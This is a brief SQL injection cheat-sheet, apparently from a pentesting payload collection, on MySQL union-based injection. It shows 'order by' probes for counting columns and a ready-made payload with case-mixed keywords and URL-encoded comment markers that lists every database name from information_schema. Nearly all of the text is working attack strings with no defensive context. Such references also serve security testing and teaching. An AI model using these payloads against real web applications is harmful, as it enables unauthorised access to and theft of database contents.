## MYSQL Union Based

### Extract database with information_schema

First you need to know the number of columns, you can use `order by`

```sql
order by 1
order by 2
order by 3
...
order by XXX
```

OR

`1' order by 1,2,3%23`



Then the following codes will extract the databases'name, tables'name, columns'name.

#### Extract DATABASE NAME

`1' UniOn Select 1,gRoUp_cOncaT(0x7c,schema_name,0x7c),3+fRoM+information_schema.schemata%23`
